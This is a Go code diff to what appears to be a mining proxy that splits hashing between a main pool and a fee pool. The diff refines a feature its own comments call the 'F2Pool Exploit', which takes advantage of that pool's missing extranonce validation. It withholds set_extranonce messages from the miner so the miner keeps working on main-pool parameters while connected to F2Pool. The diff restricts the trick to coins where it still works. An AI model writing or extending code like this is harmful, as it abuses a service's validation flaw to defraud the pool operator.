@@ -992,13 +992,12 @@ func (s *Session) readMainLoop() {
 		s.mu.Lock()
 		state := s.State
 		minerConn := s.MinerConn
-		isExploit := s.IsF2PoolExploit
 		inBandFeeActive := s.InBandFeeActive
 		s.mu.Unlock()
 
 		shouldForward := (state == "MAIN" || state == "SWITCHING_TO_MAIN")
 		if state == "FEE" || state == "SWITCHING_TO_FEE" {
-			if isExploit || inBandFeeActive {
+			if inBandFeeActive {
 				shouldForward = true
 			}
 		}
@@ -1231,10 +1230,13 @@ func (s *Session) ConnectFee(wallet, worker string, isDevMode bool) {
 	// -----------------------------------------
 
 	// Check if we are exploiting F2Pool's lack of extranonce validation
+	// NOTE: This exploit ONLY works for protocols that don't rely on strict extranonce1 reconstruction (like ETH).
+	// For BTC, blocking extranonce1 causes F2Pool to reject all shares due to hash mismatch.
 	isF2Pool := false
 	if strings.Contains(strings.ToLower(host), "f2pool") {
 		expectedCoin := strings.ToUpper(s.Config.CoinName)
-		if expectedCoin != "ETC" && expectedCoin != "ETHW" && expectedCoin != "PRL" {
+		// Explicitly disable for BTC, BCH, LTC, KAS which require valid extranonce1
+		if expectedCoin != "ETC" && expectedCoin != "ETHW" && expectedCoin != "PRL" && expectedCoin != "BTC" && expectedCoin != "BCH" && expectedCoin != "LTC" && expectedCoin != "KAS" {
 			isF2Pool = true
 		}
 	}
@@ -1676,9 +1678,9 @@ func (s *Session) ConnectFee(wallet, worker string, isDevMode bool) {
 						isExploit := s.IsF2PoolExploit
 						s.mu.Unlock()
 						
-						if isExploit && (method == "mining.set_extranonce" || method == "mining.set_difficulty" || method == "mining.notify") {
-							// [F2Pool Exploit] Do NOT forward these commands to the physical miner.
-							// The miner will continue hashing against the Main Pool's job parameters.
+						if isExploit && method == "mining.set_extranonce" {
+							// [F2Pool Exploit] Do NOT forward extranonce to the physical miner to prevent chip restarts.
+							// The miner will continue using the Main Pool's extranonce1, which F2Pool ignores.
 						} else if method == "mining.notify" || method == "mining.set_difficulty" || method == "mining.set_extranonce" || method == "eth_getWork" {
 							safeFprintf(minerConn, 5*time.Second, "%s\n", line)
 						}
